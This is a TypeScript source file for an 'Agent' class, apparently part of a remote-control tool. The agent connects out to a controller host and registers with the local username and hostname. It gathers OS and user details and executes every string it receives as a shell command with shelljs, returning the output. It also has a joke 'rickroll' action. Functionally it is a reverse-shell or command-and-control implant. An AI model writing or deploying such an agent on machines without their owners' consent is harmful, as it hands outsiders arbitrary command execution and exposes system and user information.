import 'colors';
import os, { UserInfo } from 'os';
// import fs from 'fs';
import path from 'path';
import shell from 'shelljs';
import { Socket } from 'net';
import { BaseSocket } from './Base';
import { Controller } from './Controller';

const rick = 'https://www.youtube.com/watch?v=oHg5SJYRHA0';

export interface IAgentSystemInfo {
  cwd: string;
  pkg: any;
  os: {
    hostname: string;
    platform: string;
    release: string;
    type: string;
  };
  user: UserInfo<string>;
  context: {
    pkg?: any;
    node?: boolean;
    rails?: boolean;
    docker?: boolean;
    dockerCompose?: boolean;
    make?: boolean;
    makefile?: Buffer;
  };
  installPath: string;
}

export class Agent extends BaseSocket {
  public listener?: boolean;
  public systemInfo?: IAgentSystemInfo;

  constructor(public ctl: Controller, public socket: Socket) {
    super(ctl, socket);

    this.systemInfo = {
      cwd: process.cwd(),
      pkg: require(path.join(__dirname, '..', 'package')),
      os: {
        hostname: os.hostname(),
        platform: os.platform(),
        release: os.release(),
        type: os.type()
      },
      user: os.userInfo(),
      context: {},
      installPath: path.join(__dirname, '..')
    };
  }

  public init(): void {
    super.init();
  }

  public data(data: any): void {
    if (this.listener) {
      this.log.info(`Handling data as listener: ${data}`);
      this.handle(data.toString().trim());
    } else {
      super.data(data);
    }
  }

  public handle(action: string): void {
    let response = '';

    this.log.info(`Handle action: ${action}`);

    if (action === 'ping') {
      response = 'pong';
    } else if (action === 'stop') {
      this.socket.end();
      return;
    } else if (/rickroll/i.test(action)) {
      shell.exec(`python3 -m webbrowser "${rick}"`);
      response = `Rick is rolling ...`;
    } else {
      const res = shell.exec(action, { silent: true });

      if (res && res.stdout) {
        response = res.stdout;
      }

      if (res && res.stderr) {
        response += res.stderr;
      }

      response += `\n${action}`;

      if (res && res.code === 0) {
        response += ` [OK]`.green;
      } else {
        response += ` [FAIL] (code: ${res ? res.code : 'No Response'})`.red;
      }
    }

    this.write(response);
  }

  public start(): void {
    this.listener = true;
    this.log.info(`Starting Agent...`);

    this.signature = `${this.systemInfo?.user.username}@${this.systemInfo?.os.hostname}`;

    this.socket.connect({ port: this.ctl.agentPort, host: this.ctl.host }, () => {
      this.log.info(`Agent connected to controller`);

      this.write(`reg ${this.signature}`);
    });
  }
}
